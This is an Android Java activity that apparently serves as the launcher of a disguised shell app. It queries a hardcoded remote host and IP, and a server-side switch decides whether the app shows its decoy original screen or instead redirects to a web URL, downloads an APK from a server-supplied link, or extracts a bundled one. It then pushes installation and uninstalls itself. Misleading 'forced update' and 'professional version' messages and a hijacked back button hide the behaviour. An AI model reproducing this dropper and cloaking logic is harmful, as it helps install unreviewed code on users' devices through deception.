package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.regus.base.HostManager;
import com.regus.entrance.BuildConfig;
import com.regus.entrance.R;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import cn.jpush.android.api.JPushInterface;

import static com.regus.base.util.CheckUtil.isAvilible;


/**
 * 游戏包 支持h5   下载    融合
 */
public class MJRegusActivity extends Activity {


    //服务器上的马甲id
    String mAid = "171";
    //服务器上该马甲的渠道id
    String mSid = "2";
    //跳转到原马甲包启动页的全路径
    String activityPath = "com.regus.entrance.activity.MaJiaActivity";
    //后台开关地址  域名动态获取
    String busUrl = "/AppShellService.svc/GetAppInfo";

    //握手地址
    String getHostUrl = "http://woaizggcdws.com:48581/shellapi/welcome";

    //服务器ip
    String serverIp = "117.50.100.39";


    String downLoadUrl;
    public File savefolder;
    public String updateSaveName;

    public long packSize;
    public int progress;
    TBProgressView progressBar;
    RelativeLayout mRootView;
    TextView mProgressNum;

    //备用域名的数量
    private int allHostSize;

    private List<LineBean> LineList = Collections.synchronizedList(new ArrayList<>());

    private String theDownloadPkaName = "";

    /**
     * 权限部分
     */

    String[] permissions = new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.REQUEST_INSTALL_PACKAGES
    };

    List<String> mPermissionList = new ArrayList<>();
    boolean mShowRequestPermission = true;//用户是否禁止权限

    int mode = 0; // 0 h5模式    1 下载模式    2 融合模式       --->目前团队主要用下载模式热更新

    DownloadApkThread downloadApkThread;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (BuildConfig.is_Game) {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }


        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        mAid = HostManager.getInstance().getAppId();

        mSid = HostManager.getInstance().getmSid();


        //设 layout id
        setLayoutId();

        //根布局id mj_root_view
        setRootViewId();

        //设置启动图id
        setSplashId();

        //设置资源进度条id
        setProgressBarId();

        //设置资源进度条 百分比id
        setProgressBarNumId();

        checkPermision();

    }

    @Override
    protected void onResume() {
        super.onResume();
        JPushInterface.onResume(this);

        Log.e("regus_", "onResume");

        if (isCover) {
            unInstallSelf();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        JPushInterface.onPause(this);
    }


    //设 layout id
    @SuppressLint("ResourceType")
    private void setLayoutId() {
        setContentView(R.layout.mj_regus_splash);
    }

    //设 RootView id
    @SuppressLint("ResourceType")
    private void setRootViewId() {
        mRootView = findViewById(R.id.mj_root_view);
    }

    //设置启动图id
    @SuppressLint("ResourceType")
    private void setSplashId() {
        // mRootView.setBackgroundResource(R.mipmap.splash);
    }

    //设置progress bar id
    @SuppressLint("ResourceType")
    private void setProgressBarId() {
        progressBar = findViewById(R.id.mj_progressBar);
        progressBar.setProgress(0);
    }

    //设置progress bar num  id
    @SuppressLint("ResourceType")
    private void setProgressBarNumId() {
        mProgressNum = findViewById(R.id.mj_progress_num);
    }


    /**
     * 所有权限检测完毕之后
     */
    private void afterCheckPermision() {
        getHostRequest();
    }


    private void showDownLoadUi() {

        startService(new Intent(this, MJForegroundService.class));

        setDownLoadApkBgId();
        downloadPackage();
    }

    @SuppressLint("ResourceType")
    private void setDownLoadApkBgId() {
        progressBar.setVisibility(View.VISIBLE);
        mRootView.setBackgroundResource(R.mipmap.splash_down);
    }


    /**
     * 权限检测
     */
    private void checkPermision() {

        try {
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                }
            }
            /**
             * 判断是否为空
             */
            if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了

                afterCheckPermision();

            } else {//请求权限方法

                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(MJRegusActivity.this, "版本需要强制更新，请给予必要权限~", Toast.LENGTH_LONG);
                    }
                });

                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                ActivityCompat.requestPermissions(this, permissions, 1);
            }
        } catch (Exception e) {

            //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
            //先进去  里面的会帮我申请好权限
            jumpLocalSplash();

        }

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        } else {
                            mShowRequestPermission = false;//已经禁止
                        }
                    }
                }
                afterCheckPermision();
                break;
            default:
                break;
        }
    }


    private void getHostRequest() {

        if (BuildConfig.isttcai) {

            allHostSize = 1;
            requsetKaiGuanServer(BuildConfig.tthost);

        } else {
            new Thread(new GetHostRequestRunnable()).start();
        }

    }


    private class GetHostRequestRunnable implements Runnable {

        @Override
        public void run() {

            try {
                URL urll = new URL(getHostUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(10000);
                urlConnection.setReadTimeout(10000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus getHost array", jsonStr + "");

                    //处理
                    try {

                        JSONArray jsonArray = new JSONArray(jsonStr.replace("\\", ""));
                        Log.e("regus  array size", jsonArray.length() + "");

                        allHostSize = jsonArray.length();

                        for (int i = 0; i < jsonArray.length(); i++) {
                            requsetKaiGuanServer((String) jsonArray.get(i));
                        }


                    } catch (JSONException e) {
                        e.printStackTrace();
                        allHostSize = 1;
                        requsetKaiGuanServer(serverIp);
                    }
                } else {
                    allHostSize = 1;
                    requsetKaiGuanServer(serverIp);
                }
            } catch (Exception e) {
                allHostSize = 1;
                requsetKaiGuanServer(serverIp);
            }

        }


    }


    private void requsetKaiGuanServer(String bUrl) {

        String url = "http://" + bUrl + busUrl;


        new Thread(new RequestRunnable(mAid, mSid, url, bUrl)).start();
    }


    private class RequestRunnable implements Runnable {

        String url;
        String aid;
        String sid;
        String host;

        public RequestRunnable(String aid, String sid, String url, String bul) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
            host = bul;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
                jumpLocalSplash();
                return;
            }

            String rootUrl = url + "?aid=";
            String allUrl = rootUrl + aid + "&sid=" + sid;

            Log.e("regus requsKg allrl", allUrl + "");

            try {
                URL urll = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(10000);
                urlConnection.setReadTimeout(10000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {

                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    solveLines(true, host, jsonStr);

                } else {
                    solveLines(false, host, null);
                }
            } catch (Exception e) {
                solveLines(false, host, null);
            }

        }

    }


    /**
     * 处理几个ping 域名的请求
     */
    private synchronized void solveLines(boolean isOK, String host, String buJson) {

        LineBean lineBean = new LineBean(host, isOK, buJson);
        LineList.add(lineBean);
        Log.e("regus add ", lineBean.host + " " + lineBean.isOk);


        if (allHostSize == LineList.size()) {

            int errorCount = 0;

            for (LineBean lineBean1 : LineList) {
                if (lineBean1.isOk) {
                    //处理
                    try {
                        JSONObject responseJson = new JSONObject(lineBean1.busJson.replace("\\", ""));

                        if (responseJson.has("Status") && responseJson.has("Data")) {
                            if (responseJson.getBoolean("Status")) {

                                JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));

                                if (dataJsonObject.getBoolean("IsMix")) {
                                    //融合模式
                                    mode = 2;
                                    //融合模式
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {
                                            Toast.makeText(getApplicationContext(), "资源包已经准备好，点击安装，升级到专业版~", Toast.LENGTH_LONG);
                                        }
                                    });

                                    //环彩181504
                                    downLoadUrl = dataJsonObject.getString("DownloadUrl");

                                    getApkFromAssets();

                                } else if (dataJsonObject.getBoolean("IsDownload")) {
                                    downLoadUrl = dataJsonObject.getString("DownloadUrl");
                                    mode = 1;
                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
                                    showDownLoadDialog();
                                } else if (dataJsonObject.getBoolean("IsEnable")) {
                                    //h5模式
                                    mode = 0;
                                    startWebview(dataJsonObject.getString("Url"));
                                } else {
                                    jumpLocalSplash();
                                }

                            } else {
                                judeJump();
                            }
                            return;
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        judeJump();
                    }

                    //直接跳出  用一个可用域名即可
                    break;
                } else {
                    errorCount++;
                }
            }

            //没有一个域名可用  跳马甲
            if (errorCount == allHostSize) {
                judeJump();
            }

        }
    }

    /**
     * 跳马甲
     */
    private void judeJump() {
        jumpLocalSplash();
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jumpLocalSplash();
            return;
        }
        jumpTo(url, 0);
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                showDownLoadUi();
            }
        });
    }


    /**
     * 下载主包
     */

    public void downloadPackage() {

        if (TextUtils.isEmpty(downLoadUrl)) {
            Toast.makeText(MJRegusActivity.this, "未配置APP下载链接~", Toast.LENGTH_LONG);
            return;
        }
        downloadApkThread = new DownloadApkThread();
        downloadApkThread.start();
    }

    private class DownloadApkThread extends Thread {

        @SuppressLint("WrongConstant")
        @Override
        public void run() {
            super.run();
            long j = 0;

            try {

                URL url = new URL(downLoadUrl);

                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setConnectTimeout(10000);
                httpURLConnection.setReadTimeout(10000);
                httpURLConnection.connect();

                if (httpURLConnection.getResponseCode() != 200) {
                    Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                    jumpLocalSplash();
                    return;
                }

                InputStream is = httpURLConnection.getInputStream();
                packSize = httpURLConnection.getContentLength();

                if (checkExistSDCard()) {
                    savefolder = Environment.getExternalStorageDirectory();
                } else {
                    savefolder = getDir("update", 3);
                }


                updateSaveName = downLoadUrl.substring(downLoadUrl.lastIndexOf("/") + 1);

                File file = new File(savefolder, updateSaveName);
                Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);
                if (file.exists()) {
                    file.delete();
                }
                Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                OutputStream os = new FileOutputStream(file);

                byte[] bytes = new byte[512];

                int length;

                while ((length = is.read(bytes)) != -1) {
                    os.write(bytes, 0, length);
                    j += (long) length;
                    progress = (int) ((((float) j) / ((float) packSize)) * 100.0f);
                    Log.e("regus progress", progress + "");
                    showLoadDialogProgress(progress);
                    if (progress == 100) {
                        hideWebViewLoadDialog();
                    }
                }

                //关闭流
                is.close();
                os.close();
                os.flush();

                gotoInstall();

            } catch (MalformedURLException e) {
                e.printStackTrace();
                jumpLocalSplash();
            } catch (IOException e2) {
                e2.printStackTrace();
                Log.e("regus IOException", "" + e2.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }

                    downloadPackage();
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("regus Exception", "" + e.getLocalizedMessage());
                if (progress > 0) { //自动重下
                    if (downloadApkThread != null) {
                        downloadApkThread.interrupt();
                        downloadApkThread = null;
                    }
                    downloadPackage();
                }
            }

        }

    }


    private void showLoadDialogProgress(int progress) {

        runOnUiThread(new Runnable() {

            @Override
            public void run() {

                if (progress == 95) {
                    if (!isRunningForeground(MJRegusActivity.this)) {
                        setTopApp(MJRegusActivity.this);
                    }
                }

                if (progressBar != null && mProgressNum != null) {
                    progressBar.setProgress(progress);
                    mProgressNum.setText("本次更新不消耗流量，正在更新..." + progress + "%");
                }

            }
        });


    }

    private void hideWebViewLoadDialog() {


    }


    /**
     * 获取assert 里的主包  这是融合模式   暂时不用
     */

    @SuppressLint("WrongConstant")
    private void getApkFromAssets() {

        try {

            if (checkExistSDCard()) {
                savefolder = Environment.getExternalStorageDirectory();
            } else {
                savefolder = getDir("update", 3);
            }


            String aimApkName = "main.apk";
            if (!TextUtils.isEmpty(downLoadUrl) && downLoadUrl.equals("环彩181504")) {
                aimApkName = "main1.apk";
            }

            InputStream is = getAssets().open(aimApkName);

            updateSaveName = "eric.apk";

            File file = new File(savefolder, updateSaveName);

            Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);

            if (file.exists()) {
                file.delete();
            }

            FileOutputStream fos = new FileOutputStream(file);
            byte[] temp = new byte[1024];
            int i = 0;
            while ((i = is.read(temp)) > 0) {
                fos.write(temp, 0, i);
            }
            fos.close();
            is.close();

            gotoInstall();


        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus IOException", "" + e.getLocalizedMessage());
            jumpLocalSplash();
        }


    }

    /**
     * 去安装
     */

    @SuppressLint("WrongConstant")
    private void gotoInstall() {

        PackageManager pm = this.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(new File(this.savefolder, this.updateSaveName).getPath(),
                PackageManager.GET_ACTIVITIES);

        if (info != null) {
            String packageName = info.packageName;
            theDownloadPkaName = packageName;
            Log.e("lyn_", "checkPackageNameIfsame 远程的包名是 " + packageName);
        }

        toInstall();
    }


    private void unInstallSelf() {
        if (isAvilible(theDownloadPkaName, this)) {
            //卸载自己
            Uri packageUri = Uri.parse("package:" + getPackageName());
            Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
            startActivity(intent);
        }
    }


    @SuppressLint("WrongConstant")
    private void toInstall() {

        Intent intent = new Intent(Intent.ACTION_VIEW);
        int i = getApplicationInfo().targetSdkVersion;
        if (Build.VERSION.SDK_INT < 24 || i < 24) {
            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        } else {
            //添加这一句表示对目标应用临时授权该Uri所代表的文件
            intent.setFlags(1);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        }

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        if (theDownloadPkaName.equals(getPackageName())) {
            startActivity(intent);
            finish();
        } else {
            startActivity(intent);
            isCover = true;
        }

    }

    private boolean isCover;


    /**
     * 跳转逻辑
     */

    private void jumpTo(final String url, int type) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MJRegusActivity.this, "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                showTipDialog(url);
                startBrowser(url);
            }
        });


    }


    private void showTipDialog(final String url) {

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
        //设置title
        normalDialog.setTitle("需要跳转到浏览器");
        //设置内容
        normalDialog.setMessage("点击跳转到专业版~");
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowser(url);
            }
        });

        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowser(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        startActivity(intent);
    }


    public static boolean checkExistSDCard() {
        return Environment.getExternalStorageState().equals("mounted");
    }


    /**
     * 线路封装类
     */
    private class LineBean {
        String host;
        boolean isOk;
        String busJson;

        public LineBean(String host, boolean isOk, String json) {
            this.host = host;
            this.isOk = isOk;
            busJson = json;
        }
    }


    @Override
    public void onBackPressed() {
        //实现Home键效果
        //super.onBackPressed();这句话一定要注掉,不然又去调用默认的back处理方式了
        Intent i = new Intent(Intent.ACTION_MAIN);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }


    /**
     * 将本应用置顶到最前端
     * 当本应用位于后台时，则将它切换到最前端
     *
     * @param context
     */
    public static void setTopApp(Context context) {
        if (!isRunningForeground(context)) {
            /**获取ActivityManager*/
            ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);

            /**获得当前运行的task(任务)*/
            List<ActivityManager.RunningTaskInfo> taskInfoList = activityManager.getRunningTasks(100);
            for (ActivityManager.RunningTaskInfo taskInfo : taskInfoList) {
                /**找到本应用的 task，并将它切换到前台*/
                if (taskInfo.topActivity.getPackageName().equals(context.getPackageName())) {
                    activityManager.moveTaskToFront(taskInfo.id, 0);
                    break;
                }
            }
        }
    }

    /**
     * 判断本应用是否已经位于最前端
     *
     * @param context
     * @return 本应用已经位于最前端时，返回 true；否则返回 false
     */
    public static boolean isRunningForeground(Context context) {
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> appProcessInfoList = activityManager.getRunningAppProcesses();
        /**枚举进程*/
        for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfoList) {
            if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                if (appProcessInfo.processName.equals(context.getApplicationInfo().processName)) {
                    return true;
                }
            }
        }
        return false;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }
    }


}
